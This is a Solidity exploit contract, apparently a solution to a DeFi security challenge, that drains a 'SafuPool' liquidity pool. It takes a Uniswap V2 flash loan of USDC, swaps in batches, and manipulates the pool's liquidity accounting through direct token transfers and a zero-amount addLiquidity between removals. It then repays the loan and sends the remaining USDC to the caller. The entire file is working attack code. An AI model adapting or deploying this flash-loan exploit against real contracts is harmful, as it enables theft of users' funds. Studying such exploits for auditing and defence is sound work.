// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/console.sol";

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ISafuPool {
    function approve(address, uint256) external returns (bool);
    function swap(address toToken, uint256 amount) external returns (uint256);
    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint256);
    function removeAllLiquidity() external returns (uint256, uint256);
}

/// @dev Exploiter contract for SafuPool
contract SwapperExploiter {
    IUniswapV2Pair pair;
    ISafuPool safuPool;
    IERC20 usdc;
    IERC20 safu;

    constructor(address _uniswapPairAddress, address _safuPoolAddress, address _usdcAddress, address _safuAddress) {
        pair = IUniswapV2Pair(_uniswapPairAddress);
        safuPool = ISafuPool(_safuPoolAddress);
        usdc = IERC20(_usdcAddress);
        safu = IERC20(_safuAddress);
    }

    /// @dev Runs exploit, flashloan borrows Uniswap USDC liq
    function runExploit(uint256 amount) external {
        usdc.approve(address(safuPool), type(uint256).max);
        safu.approve(address(safuPool), type(uint256).max);

        pair.swap(amount, 0, address(this), bytes(" "));
    }

    /// @dev Uniswap flashloan callback
    /// @dev Swaps done in batches b/c extra fees for large swaps
    function uniswapV2Call(
        address _sender,
        uint256 _amount0, // usdc
        uint256 _amount1,
        bytes calldata _data
    ) external {
        for (uint256 i = 0; i < 5; ++i) {
            safuPool.swap(address(safu), 8_000 * 1e18);
        }

        uint256 safuAmount = safu.balanceOf(address(this));
        safuPool.addLiquidity(safuAmount, safuAmount);

        for (uint256 i = 0; i < 5; ++i) {
            safuPool.swap(address(safu), 8_000 * 1e18);
        }

        safuAmount = safu.balanceOf(address(this));
        safu.transfer(address(safuPool), safuAmount);
        usdc.transfer(address(safuPool), 625_000 * 1e18);

        safuPool.removeAllLiquidity();
        safuPool.addLiquidity(0, 0);
        safuPool.removeAllLiquidity();

        safuPool.swap(address(usdc), safu.balanceOf(address(this)));

        console.log("koniec", usdc.balanceOf(address(this)) / 1e18);

        uint256 loanPlusInterest = (_amount0 * (10 ** 18) * 1000 / 997 / (10 ** 18)) + 1;
        usdc.transfer(msg.sender, loanPlusInterest);
        usdc.transfer(tx.origin, usdc.balanceOf(address(this)));
    }
}
